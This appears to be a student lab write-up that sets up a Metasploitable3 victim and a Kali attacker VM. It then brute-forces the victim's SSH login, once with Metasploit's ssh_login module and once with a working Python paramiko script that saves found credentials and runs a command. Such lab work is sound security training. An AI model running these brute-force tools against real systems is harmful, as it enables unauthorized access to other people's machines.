# Phase 1

In this phase, we will deploy our victim and attacker environments. We’ll configure Metasploitable3 as the victim machine—complete with its built-in vulnerable services (IIS FTP/HTTP, SSH, WinRM, WebDAV, SNMP, SMB, RDP, etc.)—and spin up a Kali Linux attacker host on the same network. Once both VMs are running, we’ll verify connectivity by scanning and pinging the victim from Kali.

Next, we’ll tackle the exploitation tasks:  
1. **Task 1.1** – Use Metasploit’s modules to discover and compromise one of the victim’s services.  
2. **Task 1.2** – Develop a custom script that automates the exploit, captures proof-of-concept output, and saves valid credentials.  

By the end of Phase 1, we will have hands-on experience with both framework-driven and script-based attack techniques.  

## Setting Up the Victim Machine (Metasploitable3)

We started by visiting the official Vagrant repository by Rapid7:  
🔗 [https://app.vagrantup.com/rapid7](https://app.vagrantup.com/rapid7)

There were two available versions: Ubuntu and Windows.  
We selected `rapid7/metasploitable3-ub1404` as it is commonly used in penetration testing labs and works well with VirtualBox.

![WhatsApp Image 1446-10-24 at 09 34 26](https://github.com/user-attachments/assets/a0647132-821b-43da-8efa-c52020d56ecc)


---

## Converting for macOS

One of our team members used a Mac, which led to some compatibility issues with VirtualBox.  
To solve this, we converted the `.vmdk` image into `.qcow2` format using `qemu-img`, which works with UTM:

```bash
brew install qemu
cd ~/Downloads
qemu-img convert -O qcow2 -c metasploitable3-ub1404-disk001.vmdk metasploitable3-ub1404.qcow2
```
![WhatsApp Image 1446-10-24 at 09 39 51](https://github.com/user-attachments/assets/04d086d2-b72f-4052-9dec-63a7486ac23c)

---

## 🖥️ Creating the VM in UTM

After the conversion, we created the victim VM using UTM on macOS.  
Steps followed:
- Chose **"Emulate"** when creating the VM
- Architecture: `x86_64`
- RAM: `1024 MB`
- Unchecked **UEFI Boot**
- Attached the `.qcow2` disk as the main drive
- Named the machine `Metasploitable`

We then started the VM and successfully logged in using:
- **Username:** `vagrant`
- **Password:** `vagrant`

---

##  Attacker Environment Setup (Kali Linux)

For the attacker environment, we used Kali Linux, which was already downloaded and set up in a previous course assignment.  
It was imported into VirtualBox using the official `.ova` file from Kali's website:

🔗 [https://www.kali.org/get-kali/#kali-virtual-machines](https://www.kali.org/get-kali/#kali-virtual-machines)

---

### 🌐 Network Configuration (Both Machines)


We configured the network for both Metasploitable3 (victim) and Kali (attacker) using the **Bridged Adapter** mode.

This allowed both virtual machines to be on the same local Wi-Fi network, making it easy to communicate between them.

After setting up the network:
- We ran `ifconfig` on the victim machine and confirmed the IP address: `192.168.64.7`
- We pinged the victim from Kali using:

```bash
ping 192.168.64.7
```


 *Screenshots:*


 ![WhatsApp Image 1446-10-24 at 09 46 06](https://github.com/user-attachments/assets/979be9a8-854b-417c-a507-16346006b46d)
  
  → This shows the IP address of the victim machine (`192.168.64.7`)

 ![WhatsApp Image 1446-10-24 at 09 46 59](https://github.com/user-attachments/assets/a2b5d3e6-36b1-4bc9-bc17-dccc7aed0ae1)

  → This confirms that the attacker and victim are connected and able to communicate

## 🔍 Service Scan and Target Selection (Nmap + SSH Focus)

After verifying network connectivity, we used `nmap` from the attacker machine (Kali) to scan the victim for open services and their versions:

```bash
nmap -sV 192.168.64.7
```
![WhatsApp Image 1446-10-24 at 09 47 41](https://github.com/user-attachments/assets/2de59852-74b6-40d7-8f99-f878cd875f3f)

This revealed several services running on the victim, including:

- `21/tcp` → FTP: ProFTPD 1.3.5
- `22/tcp` → **SSH: OpenSSH 6.6.1p1**
- `80/tcp` → HTTP: Apache 2.4.7
- `445/tcp` → SMB: Samba 3.X - 4.X
- `3306/tcp` → MySQL (unauthorized)
- `8080/tcp` → Jetty

We chose to focus on the **SSH service** as our target for exploitation because:
- It was accessible via port 22 on IP `192.168.64.7`
- The version in use (`OpenSSH 6.6.1`) is known to be outdated
- SSH is a critical service that can provide full shell access if compromised

---

## SSH Brute Force Attack (Metasploit)

To initiate the attack on the SSH service, we followed a structured approach:

---

### Step 1: Prepare Wordlists and Launch Metasploit Console

Before launching the brute-force attempt, we created two wordlists to simulate a dictionary attack:

- `users.txt` → a list of potential usernames (`admin`, `user`, `vagrant`, etc.)
- `pass.txt` → a list of commonly used or weak passwords

These lists help automate the process of trying multiple login combinations to uncover valid credentials.

We then started Metasploit by running the following command in the terminal:

```bash
msfconsole
```

![WhatsApp Image 1446-10-23 at 10 05 00](https://github.com/user-attachments/assets/1b8cfd11-e706-4602-b64c-6cdb9d894029)

---

### Step 2: Search for SSH-Related Modules

After launching Metasploit, we searched for SSH-related modules to identify potential tools for exploitation.

We used the following command:

```bash
search ssh
```

![WhatsApp Image 1446-10-24 at 09 53 38](https://github.com/user-attachments/assets/c2d9bedb-91cc-421a-8c81-e972a594930b) 

---
### Step 3: Select the SSH Login Module

From the search results, we selected the SSH login scanner module. This module attempts to authenticate to the target SSH service using combinations from the provided username and password lists.

We used the following command to load the module:

```bash
use auxiliary/scanner/ssh/ssh_login

We then configured the module with the following settings:

```bash
set RHOSTS 192.168.64.7
set USER_FILE /home/kali/users.txt
set PASS_FILE /home/kali/pass.txt
set BRUTEFORCE_SPEED 5
set THREADS 4
set VERBOSE true
```

 ![WhatsApp Image 1446-10-23 at 10 05 01](https://github.com/user-attachments/assets/01729688-9d8a-44d1-a556-00e3d15db390)


Then we ran the exploit using:

```bash
run
```

![WhatsApp Image 1446-10-23 at 10 05 01 (1)](https://github.com/user-attachments/assets/5e6d1eaa-527e-43ee-8bd9-58502f1e489c)


---

###  Result

The module tested various combinations and successfully found a valid login:

- **Username:** `vagrant`  
- **Password:** `vagrant`

SSH session was successfully opened to `192.168.64.7:22`, giving full shell access to the victim.

This confirms that the SSH service was vulnerable to credential-based brute-force attacks.



##  Task 1.2 - Custom SSH Attack Script (Python Proof of Concept)

To demonstrate a manual SSH-based attack without using Metasploit, we created a custom script using Python and the `paramiko` library.

---

###  Environment Setup

We first made sure the system was ready by installing `pip` and `paramiko`:

```bash
sudo apt update
sudo apt install python3-pip -y
sudo python3 -m pip install paramiko --break-system-packages
```
![WhatsApp Image 1446-10-24 at 09 30 19](https://github.com/user-attachments/assets/edb131e2-722a-4cc2-ac47-073db5589a23)


---

###  Script Logic

We created a script called `ssh_bruteforce.py` that:
- Loads usernames and passwords from two files
- Tries to login to the victim’s SSH server using `paramiko`
- If login is successful, it prints the credentials and executes `uname -a` on the server

```python
import paramiko

target_ip = "192.168.64.7"
username_file = "/home/kali/users.txt"
password_file = "/home/kali/pass.txt"
output_file = "credentials.txt"

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

with open(username_file, "r") as users, open(password_file, "r") as passwords:
    for user in users:
        for pwd in passwords:
            username = user.strip()
            password = pwd.strip()

            try:
                client.connect(target_ip, username=username, password=password, timeout=3)
                print(f"[+] Success: {username}:{password}")
               
                # Save to file
                with open(output_file, "a") as creds:
                    creds.write(f"{username}:{password}\n")

                # Proof of Concept
                stdin, stdout, stderr = client.exec_command("uname -a")
                print("PoC:", stdout.read().decode())

                client.close()
                break  

            except paramiko.AuthenticationException:
                print(f"[-] Failed: {username}:{password}")
            except Exception as e:
                print(f"[!] Error with {username}:{password} -> {e}")
        passwords.seek(0)  # Reset password file pointer for next username
```
![WhatsApp Image 1446-10-24 at 09 26 15](https://github.com/user-attachments/assets/db6a3aec-37d8-4122-ad0e-40e656cf508d)


---

###  Running the Script

We ran the script using:

```bash
python3 ssh_bruteforce.py
```

![WhatsApp Image 1446-10-24 at 09 26 37](https://github.com/user-attachments/assets/14b2eeea-889d-4539-9b55-500081df843b)



---

##  Compromising the Service using Custom Script

After developing and executing our Python script (`ssh_bruteforce.py`), we were able to successfully connect to the victim machine over SSH using the credentials:

- **Username:** `vagrant`
- **Password:** `vagrant`

The script confirmed this by:
- Executing the command `uname -a` on the victim machine (proof of shell access)
- Saving the valid credentials inside a file named `credentials.txt`
  
![WhatsApp Image 1446-10-24 at 09 26 46](https://github.com/user-attachments/assets/124d8041-4378-48cf-8b86-23c2e7da1f81)


- `[+] Success: vagrant:vagrant`
- `PoC: Linux metasploitable3-ub1404...`

![WhatsApp Image 1446-10-24 at 09 28 00](https://github.com/user-attachments/assets/41d31ea9-da25-4076-95b7-fb53e8f51c04)

